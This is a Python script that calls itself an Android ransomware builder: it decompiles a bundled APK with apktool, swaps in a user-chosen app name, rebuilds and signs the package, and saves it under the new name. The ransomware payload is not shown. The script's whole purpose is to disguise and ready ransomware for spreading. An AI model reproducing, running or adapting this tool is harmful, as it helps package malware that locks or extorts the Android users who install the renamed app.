#! /usr/bin/env python3
import os, sys, time, fileinput
from getpass import getpass
from PIL import Image

r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[0m"
bold = "\033[1m"
br = "\033[1;37;41m"
clear = "\033[1;37;40m"

app_name = ""

def banner():
    print(f"""
    {br}{bold} HACKERZ RANSOMWARE BUILDER (BETA){clear} 
    \t Developed by: Kitty dev\n""")

def writefile(file,old,new):
    while True:
        if os.path.isfile(file):
            replaces = {old:new}
            for line in fileinput.input(file, inplace=True):
                for search in replaces:
                    replaced = replaces[search]
                    line = line.replace(search,replaced)
                print(line, end="")
            break
        else: exit(r+"[!]"+w+" Failed to write in file "+file)

def start():
    global app_name
    os.system("clear")
    banner()
    print(f"{clear}{r}>>{clear} Don't modify the code kiddo :D")
    ask = str(input(f"{clear}{r}>>{clear} Do you agree (y/n): "+y).lower())
    if ask in ("yes"): pass
    else: exit(f"{clear}{r}>>{r} Don't use my tool SKIDD!!! {clear}")
    print(f"""
    {br} HACKERZ {w} {bold}is a Advance Android Ransomware Builder tool
    \t          {br}{bold} BETA TESTING SCRIPT {clear}
    """)
    print(w+"-"*43)
    while True:
        x = str(input(f"{clear}{r}>>{clear} SET app_name: "+y))
        if len(x) != 0:
            app_name = x
            break
        else: continue
    print(w+"* Building your ransomware APK's ...")
    print(w+"-"*43+d)
    os.system("apktool d beta.apk")
    strings = "beta/res/values/strings.xml"
    print("I: Using strings "+strings)
    smali = os.popen(f"find -L beta/ -name '*0000.smali'","r").readline().strip()
    print("I: Using smali "+os.path.basename(smali))
    writefile(strings,"appname",app_name)
    time.sleep(3)
    os.system("apktool b beta -o final.apk;rm -rf beta")
    os.system("java -jar ubersigner.jar -a final.apk --ks debug.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging > /dev/null 2>&1")
    os.system("java -jar ubersigner.jar -a final.apk --onlyVerify > /dev/null 2>&1")
    os.system("rm -rf final.apk")
    if os.path.isfile("final-aligned-signed.apk"):
        out = app_name.replace(" ","").lower() + ".apk"
        os.system("mv final-aligned-signed.apk "+out)
        getpass(b+">"+w+" Result saved as: "+B+" "+out+" "+w)
    else: print(r+"[!]"+w+" Failed to signed APK's")

if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        exit(r+"\n[!]"+w+" Thanks for Using this tools :D")
